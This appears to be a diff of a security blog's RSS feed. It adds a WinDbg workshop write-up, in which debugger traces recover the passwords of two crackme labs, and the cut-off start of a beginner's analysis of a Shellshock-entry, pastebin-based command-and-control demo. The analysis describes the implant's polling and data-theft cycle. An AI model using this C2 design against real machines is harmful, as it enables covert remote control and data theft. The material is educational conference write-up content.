@@ -1,4 +1,186 @@
-<?xml version="1.0" encoding="UTF-8"?><?xml-stylesheet href="/scripts/pretty-feed-v3.xsl" type="text/xsl"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:h="http://www.w3.org/TR/html4/"><channel><title>gr1d-init</title><description>No logs, no traces</description><link>https://gr1d-init.github.io</link><item><title>The SinCon RFID Research Kampung</title><link>https://gr1d-init.github.io/blog/sinconrfidkampung</link><guid isPermaLink="true">https://gr1d-init.github.io/blog/sinconrfidkampung</guid><description>Writeups for SinCon RFID Research Kampung</description><pubDate>Mon, 26 May 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;The RFID Research Kampung at SINCON 2025 was a hands-on workshop where we could explore various RFID security tools and learn about real-world attack scenarios. Here&apos;s what went down during the session.&lt;/p&gt;
+<?xml version="1.0" encoding="UTF-8"?><?xml-stylesheet href="/scripts/pretty-feed-v3.xsl" type="text/xsl"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:h="http://www.w3.org/TR/html4/"><channel><title>gr1d-init</title><description>No logs, no traces</description><link>https://gr1d-init.github.io</link><item><title>WinDbg Workshop at SinCon 2025</title><link>https://gr1d-init.github.io/blog/sinconwindbg</link><guid isPermaLink="true">https://gr1d-init.github.io/blog/sinconwindbg</guid><description>A writeup of the WinDbg workshop session at SinCon 2025, covering key debugging concepts and techniques.</description><pubDate>Tue, 27 May 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I attended an insightful WinDbg workshop at SinCon 2025. This writeup covers the key concepts, tools, and techniques discussed during the session, including practical examples and my key takeaways.&lt;/p&gt;
+&lt;h2&gt;Key Concepts Covered&lt;/h2&gt;
+&lt;p&gt;The workshop covered fundamental &lt;strong&gt;WinDbg navigation&lt;/strong&gt; and &lt;strong&gt;dynamic analysis techniques&lt;/strong&gt;. A key focus was the &lt;strong&gt;x64 calling convention&lt;/strong&gt;, which dictates how arguments are passed to functions and how return values are handled. This convention is similar to &lt;strong&gt;Linux syscalls&lt;/strong&gt;, but with a different register order for arguments, starting with &lt;strong&gt;RCX&lt;/strong&gt; instead of &lt;strong&gt;RDI&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;x64 Calling Convention Summary:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Return value:&lt;/strong&gt; &lt;code&gt;rax&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;1st argument:&lt;/strong&gt; &lt;code&gt;rcx&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2nd argument:&lt;/strong&gt; &lt;code&gt;rdx&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;3rd argument:&lt;/strong&gt; &lt;code&gt;r8&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;4th argument:&lt;/strong&gt; &lt;code&gt;r9&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;5th argument:&lt;/strong&gt; &lt;code&gt;rsp + 0x28&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;6th argument:&lt;/strong&gt; &lt;code&gt;rsp + 0x30&lt;/code&gt; (rsp + 0x28 + 4)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Additionally, the workshop covered practical skills such as &lt;strong&gt;setting breakpoints&lt;/strong&gt; at the main entry point and other decision points within the code. We learned to &lt;strong&gt;inspect register contents&lt;/strong&gt; to understand the arguments passed to key functions and to &lt;strong&gt;analyze memory dumps&lt;/strong&gt; to identify the information required to satisfy program checks&lt;/p&gt;
+&lt;hr&gt;
+&lt;h4&gt;Setting up breakpoints&lt;/h4&gt;
+&lt;p&gt;| Command          | Use                                                     |
+| ---------------- | ------------------------------------------------------- |
+| &lt;code&gt;bp XX&lt;/code&gt;          | Set a breakpoint at XX                                  |
+| &lt;code&gt;bp $entry&lt;/code&gt;      | Set a breakpoint at the entry point                     |
+| &lt;code&gt;bl&lt;/code&gt;             | List breakpoints                                        |
+| &lt;code&gt;bc X \| bd X&lt;/code&gt; | Clear \| disable breakpoint index X                     |
+| &lt;code&gt;? module!func*&lt;/code&gt; | Check if the address of a target function is “resolved” |
+| &lt;code&gt;lm&lt;/code&gt;             | List Modules (shows loaded modules’ info)               |&lt;/p&gt;
+&lt;hr&gt;
+&lt;h4&gt;Executing through&lt;/h4&gt;
+&lt;p&gt;| Command      | Use                                 |
+| ------------ | ----------------------------------- |
+| &lt;code&gt;k&lt;/code&gt;          | Display the function call stack     |
+| &lt;code&gt;p&lt;/code&gt;          | Step over the next instruction      |
+| &lt;code&gt;pc \| pt&lt;/code&gt; | Step until next call \| next return |
+| &lt;code&gt;t&lt;/code&gt;          | Step into the next instruction      |
+| &lt;code&gt;g&lt;/code&gt;          | Go: execute until a breakpoint/stop |&lt;/p&gt;
+&lt;hr&gt;
+&lt;h4&gt;Interacting with registers&lt;/h4&gt;
+&lt;p&gt;| Command        | Use                                                   |
+| -------------- | ----------------------------------------------------- |
+| &lt;code&gt;r&lt;/code&gt;            | “Display registers”: shows content of major registers |
+| &lt;code&gt;? XX&lt;/code&gt;         | “Show what X contains”                                |
+| &lt;code&gt;d(b\|w\|d\|q)&lt;/code&gt; | Display X as byte\|word\|dword\|qword                 |&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Advanced Techniques&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;(e.g., Scripting, extensions, memory analysis, crash dump analysis)&lt;/em&gt;&lt;/p&gt;
+&lt;h2&gt;Practical Exercises&lt;/h2&gt;
+&lt;h3&gt;Lab0&lt;/h3&gt;
+&lt;p&gt;First, I examined the program&apos;s behavior by running it:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/behaviour.C5xMy9CF_ZvjPlz.webp&quot; alt=&quot;Lab0 behaviour&quot;&gt;&lt;/p&gt;
+&lt;p&gt;It ask the user to enter an input and check if it is true, else, showing wrong password,&lt;/p&gt;
+&lt;p&gt;So, I use windbg&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0:000&gt; bp Lab0!main
+breakpoint 0 redefined
+0:000&gt; g
+Breakpoint 0 hit
+Lab0!main:
+00007ff6`d5931120 4889542410      mov     qword ptr [rsp+10h],rdx ss:000000f2`c54ffa38=00007ff6d59315c9
+0:000&gt; pc
+Lab0!main+0x31:
+00007ff6`d5931151 e86a000000      call    Lab0!printf (00007ff6`d59311c0)
+0:000&gt; pc
+Lab0!main+0x3d:
+00007ff6`d593115d e85e000000      call    Lab0!printf (00007ff6`d59311c0)
+0:000&gt; pc
+Lab0!main+0x54:
+00007ff6`d5931174 e8c7000000      call    Lab0!wscanf_s (00007ff6`d5931240)
+0:000&gt; pc
+Lab0!main+0x62:
+00007ff6`d5931182 e879feffff      call    Lab0!VerifyInput (00007ff6`d5931000)
+0:000&gt; t
+Lab0!VerifyInput:
+00007ff6`d5931000 48894c2408      mov     qword ptr [rsp+8],rcx ss:000000f2`c54ff7e0={Lab0!_NULL_IMPORT_DESCRIPTOR &amp;#x3C;PERF&gt; (Lab0+0x29098) (00007ff6`d5959098)}
+0:000&gt; t
+Lab0!VerifyInput+0x9:
+00007ff6`d5931009 488d0df07f0200  lea     rcx,[Lab0!_NULL_IMPORT_DESCRIPTOR &amp;#x3C;PERF&gt; (Lab0+0x29000) (00007ff6`d5959000)]
+0:000&gt; t
+Lab0!printf:
+00007ff6`d59311c0 48894c2408      mov     qword ptr [rsp+8],rcx ss:000000f2`c54ff7a0=0000000000000000
+0:000&gt; db rcx
+00007ff6`d5959000  43 68 65 63 6b 69 6e 67-20 69 6e 70 75 74 2e 2e  Checking input..
+00007ff6`d5959010  0a 00 00 00 00 00 00 00-49 00 4c 00 6f 00 76 00 65 00 57 00 69 00 6e 00 64 00 62 00 67 00 00 00  e.W.i.n.d.b.g...
+00007ff6`d5959030  57 6f 68 6f 6f 2c 20 77-65 6c 6c 20 64 6f 6e 65  Wohoo, well done
+00007ff6`d5959040  21 0a 00 00 00 00 00 00-57 72 6f 6e 67 20 70 61 73 73 77 6f 72 64 2e 20 54 72 79 20 61 67 61 69  ssword. Try agai
+00007ff6`d5959060  6e 21 0a 00 00 00 00 00-2d 2d 2d 2d 2d 2d 20 4c 61 62 20 30 20 2d 2d 2d 2d 2d 2d 0a 00 00 00  lab 0 ------.....
+0:000&gt; g
+ModLoad: 00007ff8`74370000 00007ff8`7438a000   C:\WINDOWS\SYSTEM32\kernel.appcore.dll
+ModLoad: 00007ff8`77880000 00007ff8`77929000   C:\WINDOWS\System32\msvcrt.dll
+ntdll!NtTerminateProcess+0x14:
+00007ff8`785824f4 c3              ret
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;My approach was to first set a breakpoint at the &lt;code&gt;main&lt;/code&gt; function. Then, I used the &lt;code&gt;pc&lt;/code&gt; (step to next call) command repeatedly to navigate through the execution flow until I reached the &lt;code&gt;VerifyInput&lt;/code&gt; function.&lt;/p&gt;
+&lt;p&gt;At this point, I switched to the &lt;code&gt;t&lt;/code&gt; (trace into) command to step into &lt;code&gt;VerifyInput&lt;/code&gt;. I continued stepping until I observed the &lt;code&gt;rcx&lt;/code&gt; register being used to pass an argument. Dumping the memory pointed to by &lt;code&gt;rcx&lt;/code&gt; revealed that the program expected the input to be &lt;code&gt;ILoveWindbg&lt;/code&gt; to pass the check.&lt;/p&gt;
+&lt;p&gt;After discovering the required input, I reran the program. This time, with the correct input, the program successfully passed the check and displayed a &quot;well done&quot; message, as shown below:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/welldone.WMpbVayS_1r26mk.webp&quot; alt=&quot;Lab0 welldone&quot;&gt;&lt;/p&gt;
+&lt;h3&gt;Lab 1&lt;/h3&gt;
+&lt;p&gt;First, I examined the initial behavior of the Lab 1 program:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/behaviour.Ddo-iQOA_Z2nFe2g.webp&quot; alt=&quot;Lab 1 Initial Behaviour&quot;&gt;&lt;/p&gt;
+&lt;p&gt;The program appeared to be searching for a specific file within the &lt;code&gt;C:\\Windows\\System32&lt;/code&gt; directory and exiting if not found.&lt;/p&gt;
+&lt;p&gt;Next, I used WinDbg to investigate which file it was looking for and what its requirements were.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0:000&gt; bp Lab1!main
+breakpoint 0 redefined
+0:000&gt; g
+Breakpoint 0 hit
+Lab1!main:
+00007ff6`24c31060 4889542410      mov     qword ptr [rsp+10h],rdx ss:0000006f`da11f758=00007ff624c49fd3
+0:000&gt; pc
+Lab1!main+0x8b:
+00007ff6`24c310eb ff150f2f0400    call    qword ptr [Lab1!_imp_GetCurrentDirectoryA (00007ff6`24c74000)] ds:00007ff6`24c74000={KERNEL32!GetCurrentDirectoryAStub (00007ff8`77f25ed0)}
+0:000&gt; pc
+Lab1!main+0xd0:
+00007ff6`24c31130 e88b670100      call    Lab1!strcpy_s (00007ff6`24c478c0)
+0:000&gt; pc
+Lab1!main+0xe9:
+00007ff6`24c31149 e8126e0100      call    Lab1!strcat_s (00007ff6`24c47f60)
+0:000&gt; pc
+Lab1!main+0xfb:
+00007ff6`24c3115b ff15af2e0400    call    qword ptr [Lab1!_imp_FindFirstFileA (00007ff6`24c74010)] ds:00007ff6`24c74010={KERNEL32!FindFirstFileA (00007ff8`77f37330)}
+0:000&gt; pc
+Lab1!main+0x1bb:
+00007ff6`24c3121b ff15f72d0400    call    qword ptr [Lab1!_imp_FindNextFileA (00007ff6`24c74018)] ds:00007ff6`24c74018={KERNEL32!FindNextFileA (00007ff8`77f373a0)}
+0:000&gt; pc
+Lab1!main+0x149:
+00007ff6`24c311a9 e8f26d0100      call    Lab1!strcmp (00007ff6`24c47fa0)
+0:000&gt; t
+Lab1!strcmp:
+00007ff6`24c47fa0 482bd1          sub     rdx,rcx
+0:000&gt; db rcx
+0000006f`da11f21c  30 61 65 33 62 39 39 38-2d 39 61 33 38 2d 34 62  0ae3b998-9a38-4b
+0000006f`da11f22c  37 32 2d 61 34 63 34 2d-30 36 38 34 39 34 34 31  72-a4c4-06849441
+0000006f`da11f23c  35 31 38 64 5f 53 65 72-76 69 63 69 6e 67 2d 53  518d_Servicing-S
+0000006f`da11f24c  74 61 63 6b 2e 64 6c 6c-00 01 00 00 c7 00 00 00  tack.dll........
+0000006f`da11f25c  00 00 00 00 00 00 00 00-00 00 00 00 f1 6c 43 78  .............lCx
+0000006f`da11f26c  f8 7f 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+0000006f`da11f27c  f6 7f 00 00 00 00 00 00-00 00 00 00 60 00 2c 40  ............`.,@
+0000006f`da11f28c  00 00 00 00 00 00 00 00-00 00 00 00 80 04 00 00  ................
+0:000&gt; db rdx
+00007ff6`24c89050  69 6e 70 75 74 2e 74 78-74 00 00 00 00 00 00 00  input.txt.......
+00007ff6`24c89060  5b 2b 5d 20 53 65 65 69-6e 67 20 66 69 6c 65 3a  [+] Seeing file:
+00007ff6`24c89070  20 25 73 2e 2e 2e 20 46-6f 75 6e 64 20 66 69 6c   %s... Found fil
+00007ff6`24c89080  65 2c 20 63 68 65 63 6b-69 6e 67 20 63 6f 6e 74  e, checking cont
+00007ff6`24c89090  65 6e 74 0a 00 00 00 00-5b 69 5d 20 53 65 65 69  ent.....[i] Seei
+00007ff6`24c890a0  6e 67 20 66 69 6c 65 3a-20 25 73 2e 2e 2e 20 57  ng file: %s... W
+00007ff6`24c890b0  72 6f 6e 67 20 69 6e 70-75 74 0a 00 00 00 00 00  rong input......
+00007ff6`24c890c0  5b 2d 5d 20 43 6f 75 6c-64 20 6e 6f 74 20 66 69  [-] Could not fi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;My debugging process started by setting a &lt;strong&gt;breakpoint&lt;/strong&gt; at the &lt;code&gt;main&lt;/code&gt; function (&lt;code&gt;bp Lab1!main&lt;/code&gt;). I then used the &lt;strong&gt;&lt;code&gt;pc&lt;/code&gt;&lt;/strong&gt; (step to next call) command to iterate through the execution. This continued until I encountered a call to &lt;strong&gt;&lt;code&gt;strcmp&lt;/code&gt;&lt;/strong&gt;. Using the &lt;strong&gt;&lt;code&gt;t&lt;/code&gt;&lt;/strong&gt; (trace into) command, I stepped into &lt;strong&gt;&lt;code&gt;strcmp&lt;/code&gt;&lt;/strong&gt; and examined the arguments passed in &lt;strong&gt;&lt;code&gt;rcx&lt;/code&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;code&gt;rdx&lt;/code&gt;&lt;/strong&gt;. This revealed that the program was checking for the existence of &lt;code&gt;input.txt&lt;/code&gt; in the &lt;code&gt;C:\\Windows\\System32&lt;/code&gt; directory.&lt;/p&gt;
+&lt;p&gt;To observe the program&apos;s behavior with the file present, I created &lt;code&gt;input.txt&lt;/code&gt; in the &lt;code&gt;C:\\Windows\\System32&lt;/code&gt; directory and initially filled it with the string &quot;test&quot; for further analysis:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/added.D568axox_Z2vuXqn.webp&quot; alt=&quot;Added input.txt&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/foundcheck.CI2fgD9O_Z1twMKv.webp&quot; alt=&quot;Found Check GIF&quot;&gt;&lt;/p&gt;
+&lt;p&gt;Upon re-examining the program&apos;s behavior with &lt;code&gt;input.txt&lt;/code&gt; present, I again set a &lt;strong&gt;breakpoint&lt;/strong&gt; at &lt;code&gt;main&lt;/code&gt; and used &lt;strong&gt;&lt;code&gt;pc&lt;/code&gt;&lt;/strong&gt; to step through. I noticed the program seemed to loop when checking for &lt;code&gt;input.txt&lt;/code&gt;. To understand why, I used the &lt;strong&gt;&lt;code&gt;u&lt;/code&gt;&lt;/strong&gt; (unassemble) command to inspect the assembly code and found a &lt;strong&gt;&lt;code&gt;jne&lt;/code&gt;&lt;/strong&gt; (jump if not equal) instruction causing the loop.&lt;/p&gt;
+&lt;p&gt;To bypass this loop and proceed to the next stage, I set a new &lt;strong&gt;breakpoint (&lt;code&gt;bp&lt;/code&gt;)&lt;/strong&gt; at the address immediately following the &lt;strong&gt;&lt;code&gt;jne&lt;/code&gt;&lt;/strong&gt; instruction. Using the &lt;strong&gt;&lt;code&gt;g&lt;/code&gt;&lt;/strong&gt; (go) command, I ran the program until this new breakpoint was hit, successfully moving past the file existence check.&lt;/p&gt;
+&lt;p&gt;Continuing with &lt;strong&gt;&lt;code&gt;pc&lt;/code&gt;&lt;/strong&gt;, I eventually encountered another &lt;strong&gt;&lt;code&gt;strcmp&lt;/code&gt;&lt;/strong&gt; call. This time, it was checking the &lt;em&gt;content&lt;/em&gt; of &lt;code&gt;input.txt&lt;/code&gt;. I used &lt;strong&gt;&lt;code&gt;t&lt;/code&gt;&lt;/strong&gt; to trace into this &lt;strong&gt;&lt;code&gt;strcmp&lt;/code&gt;&lt;/strong&gt; and then &lt;strong&gt;&lt;code&gt;db&lt;/code&gt;&lt;/strong&gt; to dump the contents of &lt;strong&gt;&lt;code&gt;rcx&lt;/code&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;code&gt;rdx&lt;/code&gt;&lt;/strong&gt;. This revealed that the program expected the content of &lt;code&gt;input.txt&lt;/code&gt; to be &quot;&lt;strong&gt;Lab1.exe&lt;/strong&gt;&quot;. My placeholder &quot;test&quot; string was visible in &lt;strong&gt;&lt;code&gt;rdx&lt;/code&gt;&lt;/strong&gt;, confirming the check.&lt;/p&gt;
+&lt;p&gt;Knowing the required content, I modified &lt;code&gt;input.txt&lt;/code&gt; to contain &quot;&lt;strong&gt;Lab1.exe&lt;/strong&gt;&quot;:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/string.9l1RZwIq_1EWiJ9.webp&quot; alt=&quot;Modified input.txt with Lab1.exe&quot;&gt;&lt;/p&gt;
+&lt;p&gt;After rerunning the dynamic analysis with the corrected &lt;code&gt;input.txt&lt;/code&gt;, the program successfully passed all checks and displayed a &quot;good input!&quot; message:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/done.Dw7EWnKg_Z1smwTx.webp&quot; alt=&quot;Lab 1 Done GIF&quot;&gt;&lt;/p&gt;
+&lt;h3&gt;Visualizing Execution Flow with DrawMeATree&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/CrowdStrike/drawmeatree&quot;&gt;View the DrawMeATree GitHub repository&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;One particularly interesting tool introduced was &lt;strong&gt;DrawMeATree&lt;/strong&gt;. This Python tool converts the output of WinDbg&apos;s &lt;code&gt;wt&lt;/code&gt; (Watch Trace) command into customizable graphical trees. This can be incredibly helpful for:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Identifying components, functionalities, and the overall operation of a program.&lt;/li&gt;
+&lt;li&gt;Highlighting connections between functions and modules.&lt;/li&gt;
+&lt;li&gt;Summarizing large and complex amounts of information using custom filters.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;DrawMeATree Filtering Methodology:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Generate &lt;code&gt;wt&lt;/code&gt; output into a log file.&lt;/li&gt;
+&lt;li&gt;Identify the maximum depth required for filtering (or regenerate from a function of interest if the trace is too large).&lt;/li&gt;
+&lt;li&gt;Remove irrelevant &quot;high-level&quot; nodes that would clear entire branches (e.g., allocation/freeing phases, default routines, string handling).&lt;/li&gt;
+&lt;li&gt;Remove nodes/modules that do not help answer your initial debugging question.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;A general debugging methodology incorporating DrawMeATree could be:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Start debugging at a chosen point (e.g., &lt;code&gt;bp $exentry&lt;/code&gt;, &lt;code&gt;bp module!FunctionX&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;If you don&apos;t have a specific target, use &lt;code&gt;wt&lt;/code&gt; and then &lt;strong&gt;DrawMeATree&lt;/strong&gt; to get a better overview of the execution flow.&lt;/li&gt;
+&lt;li&gt;Get as close as possible to your target and observe its behavior.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;Conclusion &amp;#x26; Takeaways&lt;/h2&gt;
+&lt;p&gt;This WinDbg workshop provided valuable insights into &lt;strong&gt;dynamic analysis on Windows&lt;/strong&gt; and the practical application of &lt;strong&gt;WinDbg&lt;/strong&gt; for &lt;strong&gt;reverse engineering&lt;/strong&gt;. The hands-on labs effectively demonstrated the &lt;strong&gt;x64 calling convention&lt;/strong&gt;, &lt;strong&gt;memory inspection techniques&lt;/strong&gt;, and &lt;strong&gt;breakpoint usage&lt;/strong&gt;. The introduction to &lt;strong&gt;DrawMeATree&lt;/strong&gt; also highlighted a method for visualizing program execution flow.&lt;/p&gt;
+&lt;p&gt;Key takeaways:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Essential &lt;strong&gt;WinDbg commands&lt;/strong&gt; for debugging.&lt;/li&gt;
+&lt;li&gt;A clearer understanding of the &lt;strong&gt;x64 calling convention&lt;/strong&gt; and its importance in analyzing function arguments and return values.&lt;/li&gt;
+&lt;li&gt;Systematic &lt;strong&gt;debugging methodology&lt;/strong&gt;: observe, hypothesize, test, and iterate.&lt;/li&gt;
+&lt;/ul&gt;</content:encoded><h:img src="/_astro/banner.C6UofPHB.png"/><enclosure url="/_astro/banner.C6UofPHB.png"/></item><item><title>The SinCon RFID Research Kampung</title><link>https://gr1d-init.github.io/blog/sinconrfidkampung</link><guid isPermaLink="true">https://gr1d-init.github.io/blog/sinconrfidkampung</guid><description>Writeups for SinCon RFID Research Kampung</description><pubDate>Mon, 26 May 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;The RFID Research Kampung at SINCON 2025 was a hands-on workshop where we could explore various RFID security tools and learn about real-world attack scenarios. Here&apos;s what went down during the session.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/banner.DiBgdpU__215lWQ.webp&quot; alt=&quot;RFID Research Kampung Banner&quot;&gt;&lt;br&gt;
 &lt;em&gt;The RFID Research Kampung setup at SINCON 2025&lt;/em&gt;&lt;/p&gt;
 &lt;h2&gt;RFID Tools Available&lt;/h2&gt;
@@ -52,7 +234,336 @@
 &lt;li&gt;&lt;strong&gt;RFID systems are vulnerable&lt;/strong&gt; — Simple UID-based authentication can be easily cloned&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;Physical access = game over&lt;/strong&gt; — Direct device access enables sophisticated attacks&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;Trust your hardware sources&lt;/strong&gt; — Common USB devices can be weaponized with minimal effort&lt;/li&gt;
-&lt;/ul&gt;</content:encoded><h:img src="/_astro/tag.BkQ6lB73.jpg"/><enclosure url="/_astro/tag.BkQ6lB73.jpg"/></item><item><title>The SinCon 2025 Dragon Badge</title><link>https://gr1d-init.github.io/blog/sincondragonbadge</link><guid isPermaLink="true">https://gr1d-init.github.io/blog/sincondragonbadge</guid><description>Writeups for SinCon Dragon Badge Challenges</description><pubDate>Sat, 24 May 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;SinCon 2025&apos;s hardware badge reimagines Singapore&apos;s iconic Dragon Playground as an interactive CTF challenge. This nostalgic tribute to the Dragon Playground at Toa Payoh, Singapore.
+&lt;/ul&gt;</content:encoded><h:img src="/_astro/tag.BkQ6lB73.jpg"/><enclosure url="/_astro/tag.BkQ6lB73.jpg"/></item><item><title>SinCon Shellshock &amp; C2 Attack Analysis</title><link>https://gr1d-init.github.io/blog/sinconshellshock</link><guid isPermaLink="true">https://gr1d-init.github.io/blog/sinconshellshock</guid><description>Writeups for SinCon Shellshock Workshop and C2 Attack Analysis</description><pubDate>Mon, 26 May 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Command &amp;#x26; Control (C2) Attack Analysis - Beginner&apos;s Guide&lt;/h2&gt;
+&lt;h3&gt;What Is This?&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/website.DItVlCv0_ZzqGQW.webp&quot; alt=&quot;Website&quot;&gt;
+&lt;em&gt;The pastebin-like website used in the C2 demonstration.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;This analyzes a &lt;strong&gt;Command and Control (C2)&lt;/strong&gt; attack that uses a pastebin website to remotely control computers. It was demonstrated in a cybersecurity workshop to teach students about modern hacking techniques.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Key Facts:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Attack Type:&lt;/strong&gt; Remote computer control via website messaging&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Entry Method:&lt;/strong&gt; Shellshock vulnerability (CVE-2014-6271)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Communication:&lt;/strong&gt; Pastebin website as secret message board&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Danger Level:&lt;/strong&gt; Very stealthy - looks like normal web browsing&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Simple Analogy:&lt;/strong&gt; Like using a library bulletin board to leave secret notes between a spy and their target.&lt;/p&gt;
+&lt;h3&gt;How C2 Attacks Work&lt;/h3&gt;
+&lt;h4&gt;The Basic Process&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Initial Compromise:&lt;/strong&gt; Hacker exploits Shellshock bug to break into computer&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Implant Installation:&lt;/strong&gt; Plants spy program (&lt;code&gt;binpaste_client_p1.py&lt;/code&gt;) on victim computer&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Communication Setup:&lt;/strong&gt; Both attacker and victim programs use same pastebin account&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Command &amp;#x26; Control:&lt;/strong&gt; Continuous cycle of commands and data theft&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4&gt;Why Use a Website Instead of Direct Connection?&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Stealth:&lt;/strong&gt; Looks like normal pastebin usage&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Evasion:&lt;/strong&gt; Hard to block without affecting legitimate users&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;No Direct Trail:&lt;/strong&gt; Attacker never connects directly to victim&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Multiple Victims:&lt;/strong&gt; One website can control many computers&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Real-World Impact:&lt;/strong&gt; Victim&apos;s passwords, files, and personal data get stolen without them knowing.&lt;/p&gt;
+&lt;h3&gt;Communication Protocol (9-Step Process)&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/process.DJdmsDh8_Z1Vmna3.webp&quot; alt=&quot;Communication Process Diagram&quot;&gt;
+&lt;em&gt;Diagram illustrating the 9-step communication protocol between attacker, C2 server (pastebin), and implant.&lt;/em&gt;&lt;/p&gt;
+&lt;h4&gt;🚀 Setup Phase&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Step 1:&lt;/strong&gt; 🔴 &lt;strong&gt;Red Team to binpaste&lt;/strong&gt;&lt;br&gt;
+Initial login (&lt;code&gt;-u eviluser -p eviluser&lt;/code&gt;)&lt;br&gt;
+&lt;em&gt;Attacker&apos;s program connects to pastebin and authenticates.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 2:&lt;/strong&gt; 💻 &lt;strong&gt;Implant to binpaste&lt;/strong&gt;&lt;br&gt;
+Initial login (&lt;code&gt;-u eviluser -p eviluser&lt;/code&gt;)&lt;br&gt;
+&lt;em&gt;Victim&apos;s spy program also logs into same pastebin account.&lt;/em&gt;&lt;/p&gt;
+&lt;h4&gt;🔄 Command Execution Cycle&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Step 3:&lt;/strong&gt; 👀 &lt;strong&gt;Implant to binpaste&lt;/strong&gt;&lt;br&gt;
+GET: Polling the main page for new commands&lt;br&gt;
+&lt;em&gt;Every 10 seconds, victim computer checks: &quot;Any new orders for me?&quot;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 4:&lt;/strong&gt; 📝 &lt;strong&gt;Red Team to binpaste&lt;/strong&gt;&lt;br&gt;
+POST: Paste the command&lt;br&gt;
+&lt;em&gt;Attacker posts command like &quot;list all files&quot; or &quot;steal passwords&quot;.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 5:&lt;/strong&gt; 📥 &lt;strong&gt;Implant to binpaste&lt;/strong&gt;&lt;br&gt;
+GET: Fetch the command&lt;br&gt;
+&lt;em&gt;Victim computer finds the command and downloads it.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 6:&lt;/strong&gt; 📤 &lt;strong&gt;Implant to binpaste&lt;/strong&gt;&lt;br&gt;
+POST: Paste the result&lt;br&gt;
+&lt;em&gt;Victim executes command and uploads stolen data/results.&lt;/em&gt;&lt;/p&gt;
+&lt;h4&gt;🧹 Cleanup Phase&lt;/h4&gt;
